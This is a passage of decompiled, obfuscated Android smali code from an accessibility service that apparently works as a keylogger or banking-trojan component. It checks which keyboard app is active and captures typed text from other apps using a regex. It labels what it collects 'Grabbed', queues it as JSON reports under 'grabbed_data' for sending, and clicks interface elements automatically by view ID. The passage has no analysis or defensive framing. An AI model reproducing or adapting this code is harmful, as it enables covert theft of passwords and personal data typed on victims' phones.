    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :pswitch_3
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "[switch"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :pswitch_4
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "[field"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "]"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto/16 :goto_1

    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "null"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "[desc] "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "\n"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->c:Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_2

    :catch_0
    move-exception v0

    :cond_5
    return-void

    nop

    :sswitch_data_0
    .sparse-switch
        -0x62465f32 -> :sswitch_2
        -0x8e34e9e -> :sswitch_4
        0x5bce347d -> :sswitch_1
        0x5e640cfd -> :sswitch_0
        0x7b7d9cff -> :sswitch_3
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
        :pswitch_1
        :pswitch_2
        :pswitch_3
        :pswitch_4
    .end packed-switch
.end method

.method private a(Ljava/lang/String;)V
    .locals 6

    new-instance v0, Lorg/json/JSONObject;

    iget-object v1, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a:Ljava/util/Map;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/util/Map;)V

    invoke-virtual {v0}, Lorg/json/JSONObject;->keys()Ljava/util/Iterator;

    move-result-object v1

    :cond_0
    :goto_0
    :try_start_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    move-result v2

    if-eqz v2, :cond_1

    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lorg/json/JSONObject;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "Grabbed: "

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\nState: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\nData: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const-string v5, "app"

    invoke-virtual {v4, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v5, "report"

    invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "com.android"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, "launcher"

    invoke-virtual {v2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-nez v3, :cond_0

    const-string v3, ""

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    new-instance v2, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    const-string v5, "grabbed_data"

    invoke-direct {v2, v3, v5}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v5, 0x0

    invoke-virtual {v4}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v5

    invoke-virtual {v2, v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/p;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    :cond_1
    return-void
.end method

.method private static a(Ljava/lang/String;ILandroid/content/Context;)Z
    .locals 5

    const/4 v0, 0x1

    const/4 v1, 0x0

    new-instance v3, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;

    invoke-direct {v3, p2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;-><init>(Landroid/content/Context;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v4, "_flow_control"

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v2}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    :try_start_0
    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/NumberFormatException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v2

    :goto_0
    if-nez v2, :cond_1

    :cond_0
    :goto_1
    return v0

    :catch_0
    move-exception v2

    move v2, v1

    goto :goto_0

    :cond_1
    if-lt v2, p1, :cond_0

    invoke-virtual {v3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/t;->close()V

    move v0, v1

    goto :goto_1
.end method

.method private static b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 3

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/CharSequence;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/CharSequence;)Ljava/lang/StringBuilder;

    goto :goto_0

    :cond_0
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public final a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    .locals 4
    .annotation build Landroid/annotation/TargetApi;
        value = 0x12
    .end annotation

    const/4 v1, 0x0

    if-nez p1, :cond_1

    :cond_0
    :goto_0
    return-void

    :cond_1
    move v2, v1

    move v0, v1

    :goto_1
    :try_start_0
    array-length v3, p3

    if-ge v2, v3, :cond_2

    aget-object v0, p3, v2

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    const/4 v3, 0x0

    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v3, 0x10

    invoke-virtual {v0, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    const/4 v3, 0x1

    add-int/lit8 v0, v2, 0x1

    move v2, v0

    move v0, v3

    goto :goto_1

    :cond_2
    if-nez v0, :cond_0

    move v0, v1

    :goto_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-ge v0, v1, :cond_0

    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    add-int/lit8 v2, p2, 0x1

    invoke-virtual {p0, v1, v2, p3}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityNodeInfo;I[Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 15
    .annotation build Landroid/annotation/TargetApi;
        value = 0x13
    .end annotation

    new-instance v0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;

    invoke-direct {v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;-><init>()V

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;

    invoke-static {v0, v1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/r;->a(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "default_input_method"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const/4 v0, 0x0

    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    if-eqz v2, :cond_7

    const-string v4, ""

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_7

    const-string v4, "com.google.android.inputmethod.latin"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "com.jb.emoji.gokeyboard"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "com.touchtype.swiftkey"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_0

    const-string v4, "com.typany.ime"

    invoke-virtual {v2, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v2

    if-eqz v2, :cond_7

    :cond_0
    const/4 v2, 0x1

    :goto_0
    if-eqz v2, :cond_1

    sget-boolean v4, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->e:Z

    if-eqz v4, :cond_1

    new-instance v4, Landroid/content/Intent;

    const-string v5, "vkb_x2"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v5, "__nscr"

    const-string v6, "1"

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->sendBroadcast(Landroid/content/Intent;)V

    const/4 v4, 0x0

    sput-boolean v4, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->e:Z

    :cond_1
    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.sec.android.inputmethod"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_2

    const/4 v0, 0x1

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    if-lez v4, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "launcher"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.android."

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.google."

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->getPackageName()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_2

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "16384"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    const-string v4, "([\u0430-\u044f\u0410-\u042fa-zA-Z0-9\\s_+:?#,.=+@$%^&*()-]+)"

    const/16 v5, 0x22

    invoke-static {v4, v5}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v4

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v4

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->find()Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-virtual {v4}, Ljava/util/regex/Matcher;->group()Ljava/lang/String;

    move-result-object v1

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->b(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v4

    const/4 v6, 0x1

    if-ne v4, v6, :cond_8

    if-eqz v5, :cond_8

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v5, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iput-object v4, p0, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->d:Ljava/lang/String;

    :goto_1
    new-instance v4, Landroid/content/Intent;

    const-string v5, "vkb_x2"

    invoke-direct {v4, v5}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v5, "__nscr"

    const-string v6, "1"

    invoke-virtual {v4, v5, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v4}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->sendBroadcast(Landroid/content/Intent;)V

    :cond_2
    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.typany.ime"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.touchtype.swiftkey"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.google.android.inputmethod.latin"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_3

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "com.jb.emoji.gokeyboard"

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_3

    if-nez v0, :cond_6

    :cond_3
    const/4 v0, 0x0

    invoke-static/range {p1 .. p1}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->a(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "8192"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    sget-boolean v4, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->e:Z

    if-eqz v4, :cond_4

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getClassName()Ljava/lang/CharSequence;

    move-result-object v4

    const-string v5, "android.widget.EditText"

    invoke-virtual {v4, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    new-instance v0, Landroid/content/Intent;

    const-string v4, "vkb_x2"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v4, "__nscr"

    const-string v5, "1"

    invoke-virtual {v0, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v0}, Ljvc/sgkqhjtjagtdtomeeetfbtvlwlldreaacwokeub/kiapuyewkifbuevalhgslhhrfksremicsnsvv/nfdxusccohwcsezxvupgijektulrfaylhrpzbmonwqnyadqkbtkvfibrmwpmyzjdslojivhaeqgtgx;->sendBroadcast(Landroid/content/Intent;)V

    const/4 v0, 0x1

    :cond_4
